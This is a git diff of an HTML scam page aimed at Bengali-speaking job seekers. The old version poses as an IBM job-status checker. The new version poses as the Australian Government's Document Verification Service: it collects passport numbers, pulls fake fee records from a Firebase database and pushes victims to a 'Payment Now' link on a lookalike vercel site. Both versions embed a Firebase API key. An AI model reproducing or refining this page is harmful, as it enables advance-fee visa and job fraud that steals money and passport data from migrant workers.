@@ -1,154 +1,118 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="bn">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Job Status Verification</title>
-<style>
-  :root{ --nav:#002f6c; --accent:#0e6fb3; --ok:#16a34a; --danger:#c62828; }
-  body{margin:0;background:#eef2f7;font-family:Arial;color:#111;}
-  header{ background:var(--nav);color:#fff;padding:18px; text-align:center;font-size:18px;font-weight:bold; }
-  .wrap{max-width:600px;margin:20px auto;padding:12px;}
-  .card{background:#fff;padding:18px;border-radius:12px; box-shadow:0 5px 20px rgba(0,0,0,0.07);margin-top:18px;}
-  input{width:100%;padding:12px;margin-top:6px;border-radius:8px; border:1px solid #cfd6df;font-size:16px;box-sizing:border-box;}
-  .btn{width:100%;padding:14px;background:var(--accent);color:#fff; border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px;}
-  
-  .row{margin:12px 0;font-size:15px;border-bottom:1px solid #f0f0f0;padding-bottom:5px;display:flex;justify-content:space-between;}
-  .k{font-weight:bold;color:#002b52;}
-  .msg-box{ background:#e7f3ff;border-left:5px solid #0e6fb3; padding:15px;border-radius:8px;margin-top:14px;font-size:14px;line-height:1.5; color:#1a3a5a;}
-  .tick{color:#16a34a;font-size:18px;font-weight:bold;margin-top:15px;text-align:center;}
-
-  #popup {
-    display: none; position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
-    background: var(--danger); color: white; padding: 15px 25px;
-    border-radius: 50px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-    z-index: 1000; font-weight: bold; width: 80%; text-align: center;
-  }
-          /* --- Footer --- */
-        footer { background: var(--dark-blue); color: white; padding: 60px 5% 20px; border-top: 1px solid rgba(255,255,255,0.05); }
-        .footer-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 40px; margin-bottom: 40px; }
-        .footer-col h4 { margin-bottom: 25px; font-size: 20px; color: #fff; }
-        .footer-links { list-style: none; padding: 0; }
-        .footer-links li { margin-bottom: 12px; }
-        .footer-links a { color: #aaa; text-decoration: none; transition: 0.3s; }
-        .footer-links a:hover { color: #ff0080; padding-left: 5px; }
-        .copyright { text-align: center; padding-top: 30px; border-top: 1px solid rgba(255,255,255,0.1); font-size: 13px; color: #777; }
-
-        /* Popup */
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; z-index: 1999; backdrop-filter: blur(5px); }
-        .popup {
-            position: fixed; top: -100%; left: 50%; transform: translate(-50%, -50%);
-            background: white; padding: 40px; border-radius: 25px; text-align: center;
-            box-shadow: 0 0 100px rgba(0,0,0,0.5); z-index: 2000; transition: 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55); width: 80%; max-width: 400px;
-        }
-        .popup.show { top: 50%; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Verification Service Assistance - Immigration and citizenship</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root { --navy: #002d5a; --blue: #0056b3; --green: #28a745; --red: #dc3545; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; margin: 0; padding: 15px; }
+        .card { max-width: 420px; margin: 20px auto; background: white; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; }
+        .header { background: var(--navy); color: white; padding: 40px; text-align: center; }
+        .header i { font-size: 25px; margin-bottom: 10px; }
+        .content { padding: 15px; }
+        label { font-size: 18px; font-weight: 600; color: #444; margin-bottom: 8px; display: block; }
+        input, select { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 8px; font-size: 15px; }
+        .btn-check { width: 100%; background: var(--blue); color: white; border: none; padding: 15px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        
+        #resultView { display: none; padding: 20px; animation: fadeIn 0.5s; }
+        .status-box { text-align: center; padding: 15px; border-radius: 10px; margin-bottom: 20px; font-weight: bold; font-size: 18px; }
+        .paid { background: #e8f5e9; color: var(--green); border: 1px solid var(--green); }
+        .not-paid { background: #fff3e0; color: #ef6c00; border: 1px solid #ef6c00; }
+        
+        .info-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px dotted #ccc; font-size: 14px; }
+        .val { font-weight: bold; color: #333; }
+        .btn-pay { display: block; background: var(--green); color: white; text-align: center; text-decoration: none; padding: 15px; border-radius: 8px; margin-top: 20px; font-weight: bold; }
+        .btn-close { width: 100%; background: #eee; color: #333; border: none; padding: 12px; border-radius: 8px; margin-top: 10px; cursor: pointer; font-weight: 600; }
+        
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
 </head>
 <body>
 
-<div id="popup">❌ ভুল নাম্বার! সঠিক Jobs ID দিন।</div>
-<header>International Business Machines Corporation (IBM) Group Ltd</header>
-<img src="https://uploads.onecompiler.io/44g2943xm/44g33hdxa/1000214345.gif" alt="Banner" width="100%">
+<div class="card">
+    <div class="header">
+<a href="https://immi-accountvisaapplications.vercel.app/" target="_blank" style="display:block;">
+  <img src="https://uploads.onecompiler.io/44ggv5rcj/44gha2js7/9468.png"  alt="aud" 
+       style="width:80%; height:auto;">
+</a>
 
+    </div>
+    
+    <div class="content" id="inputBox">
+     <h3>Employer Document Verification Service Assistance,</h3>
+      <p>• The Document Verification Service (TSS) is a joint initiative of the Australian Government and State and Territory Governments,</p>
+      <p>• The Document Verification Service (TSS) is a joint initiative of the Australian Government and State and Territory Governments,</p>
+        <label><i class="fas fa-passport"></i> Passport/Ref Number:</label>
+        <input type="text" id="userPass" placeholder="Enter Passport Number">
+        
+        <label><i class="fas fa-list"></i> Employer Document Type:</label>
+        <select id="userType">
+            <option>Application Status</option><option>Employer Jobs Status</option><option>Biometric Rrequired Submit</option>
+            <option>Manpower Status</option><option>Work permit Status</option><option>E-Visa Status</option>
+            <option>Certificate (NOC) From Employer Status</option><option>Financial Bank statements Summit</option>
+        </select>
+        <button class="btn-check" onclick="checkData()">Verification Status</button>
+    </div>
 
-<div class="wrap">
-  <div class="card">
-    <h3>• Check Your Job Status</h3>
-   <p>To check the job, you need to type the job reference number,</p>
-    <input id="jobIdInput" placeholder="Enter Jobs Reference ID Type....">
-    <button class="btn" onclick="doSearch()">Search Status</button>
-  </div>
-
-  <div id="resultBox" class="card" style="display:none;">
-    <div class="tick">✔  Thank you. Your job been  Submitted </div>
-    <div class="row"><span class="k">Employer Name:</span> <span id="r_emp"></span></div>
-    <div class="row"><span class="k">Jobs ID No:</span> <span id="r_id"></span></div>
-    <div class="row"><span class="k">Jobs Post:</span> <span id="r_post"></span></div>
-    <div class="row"><span class="k">Salary:</span> <span id="r_salary"></span></div>
-    <div class="row"><span class="k">Job Time:</span> <span id="r_time"></span></div>
-    <div class="row"><span class="k">Address:</span> <span id="r_addr"></span></div>
-    <div id="confirmMsg" class="msg-box"></div>
-<img src="https://uploads.onecompiler.io/44fhurcgn/44g7z99hy/8987.jpg" alt="Banner" width="100%">
-  </div>
+    <div id="resultView">
+        <div id="statusBadge" class="status-box"></div>
+        
+        <div class="info-row"><span>Employer:</span> <span id="rEmp" class="val"></span></div>
+        <div class="info-row"><span>Passport:</span> <span id="rPass" class="val"></span></div>
+        <div class="info-row"><span>Type:</span> <span id="rType" class="val"></span></div>
+        <div class="info-row"><span>Date:</span> <span id="rDate" class="val"></span></div>
+        <div class="info-row"><span>Amount:</span> <span id="rCurr" class="val"></span></div>
+        
+        <a href="https://best-payment-gateways-international.vercel.app/" id="payBtn" class="btn-pay">Payment Now</a>
+        <button class="btn-close" onclick="location.reload()">Close & Refresh</button>
+    </div>
 </div>
+<a href="https://immi-accountvisaapplications.vercel.app/" target="_blank" style="display:block;">
+  <img src="https://uploads.onecompiler.io/44db59mje/44ekfykza/1000210379.jpg"  alt="aud" 
+       style="width:100%; height:auto;">
+</a>
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyDgiL1iFUfbs1iaP6v_YPadbn49eiku1WE",
+        databaseURL: "https://webpagecybersecurity-default-rtdb.firebaseio.com",
+        projectId: "webpagecybersecurity",
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
-import { getFirestore, doc, getDoc, updateDoc, increment } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";
+    function checkData() {
+        const pass = document.getElementById('userPass').value;
+        const type = document.getElementById('userType').value;
+        if(!pass) return alert("পাসপোর্ট এবং রেফারেন্স নাম্বার দিন");
 
-const firebaseConfig = {
-  apiKey: "AIzaSyDgiL1iFUfbs1iaP6v_YPadbn49eiku1WE",
-  authDomain: "webpagecybersecurity.firebaseapp.com",
-  projectId: "webpagecybersecurity",
-  storageBucket: "webpagecybersecurity.firebasestorage.app",
-  messagingSenderId: "664983277240",
-  appId: "1:664983277240:web:f7e0352f673713fe596e4d"
-};
+        db.ref('fee_payments/' + pass).once('value').then((snapshot) => {
+            const data = snapshot.val();
+            if(data && data.type === type) {
+                document.getElementById('inputBox').style.display = 'none';
+                document.getElementById('resultView').style.display = 'block';
+                
+                document.getElementById('rEmp').innerText = data.employer;
+                document.getElementById('rPass').innerText = pass;
+                document.getElementById('rType').innerText = data.type;
+                document.getElementById('rDate').innerText = data.pay_date;
+                document.getElementById('rCurr').innerText = data.currency;
 
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
-
-window.doSearch = async function(){
-  const id = document.getElementById('jobIdInput').value.trim();
-if(!id){ showPopup("The job ID is incorrect, or try again later,"); return; }
-
-  try {
-    const ref = doc(db, "job_entries", id);
-    const snap = await getDoc(ref);
-
-    if(!snap.exists()){
-      showPopup("❌  the reference number and other information are incorrect, please provide the correct information. Or try again later,");
-      document.getElementById('resultBox').style.display="none";
-    } else {
-      const data = snap.data();
-      document.getElementById('resultBox').style.display="block";
-      document.getElementById('r_emp').innerText = data.employerName || "—";
-      document.getElementById('r_id').innerText = id;
-      document.getElementById('r_post').innerText = data.jobPost || "—";
-      document.getElementById('r_salary').innerText = data.salary || "—";
-      document.getElementById('r_time').innerText = data.jobTime || "—";
-      document.getElementById('r_addr').innerText = data.address || "—";
-      document.getElementById('confirmMsg').innerText = `The Time has been set for the Next (3/4) months, During this time, you will need to join Jobs,`;
-      
-      await updateDoc(ref, { views: increment(1) });
+                const badge = document.getElementById('statusBadge');
+                if(data.status === "Paid") {
+                    badge.innerHTML = "✅ Paid Successfully";
+                    badge.className = "status-box paid";
+                    document.getElementById('payBtn').style.display = 'none';
+                } else {
+                    badge.innerHTML = "⌛ Not Paid, Qickly Complete the Payment within this Time. ";
+                    badge.className = "status-box not-paid";
+                }
+            } else { alert("আপনার ডকুমেন্ট বাছাই, তথ্য সঠিক নয়! অনুগ্রহ করে সঠিক তথ্য দিয়ে আবার চেষ্টা করুন!"); }
+        });
     }
-  } catch (e) { showPopup("Error: " + e.message); }
-};
-
-function showPopup(msg) {
-  const p = document.getElementById('popup');
-  p.innerText = msg; p.style.display = "block";
-  setTimeout(() => { p.style.display = "none"; }, 3000);
-}
 </script>
-  <div class="card">
- <img src="https://uploads.onecompiler.io/44fhurcgn/44g83jukc/8992.jpg" alt="Banner" width="100%">
-    <h4>A Recruitment Notification From IBM Consulting, Which is Recruiting People for Various Business and Technical Transformation Positions.</h4>
- <h3>Recruitment: </h3><p>IBM Group Ltd is hiring for a number of positions within their organization. </p>
- <h3>Opportunities: </h3><p>Competitive salary, global experience, and professional development opportunities. </p>
- <h3>Culture: </h3><p>Offering an inclusive environment and comprehensive benefits including health and life insurance.</p>
-   
-    <div class="footer-grid">
-    <div class="footer-col">
-    <img src="https://uploads.onecompiler.io/44fhurcgn/44g8ftwqx/9005.png" width="100%" height="40%">
-    <p>As renegotiation of original five-year deal concludes.</p>
-    <p>IBM Australia is the recipient of a fresh five-year, $725 million whole-of-government arrangement.</p>
-    <img src="https://uploads.onecompiler.io/44fhurcgn/44g8dfjxs/9001.jpg" width="100" style="border-radius: 15px; opacity: 0.8; margin-top: 20px;">
-        </div>
-     <div class="footer-col">
-    <ul class="footer-links">
-       <li><a href="https://australia-gov-ibm-group-partnership.vercel.app/">Privacy Policy</a></li>
-       <li><a href="#">Copyright</a></li>
-       <li><a href="#">Accessibility</a></li>
-         <li><a href="https://australia-gov-ibm-group-partnership.vercel.app/">Disclaimer</a></li>
-            <p style="color: #aaa;"><i class="fas fa-phone"></i> 61-800-IBM Ltd</p>
-            <p style="color: #aaa;"><i class="fas fa-envelope"></i> help@ibmgovt.com</p>
-            </ul>
-        </div>
-    </div>
-    <div class="copyright">
-        <p>© Commonwealth IBM Group of Australia 2026<i class="fas fa-home"></i></p>
-        <p style="font-size: 11px;">DSTO and IBM to collaborate on cyber security Research,</p>
-    </div>
 </body>
 </html>
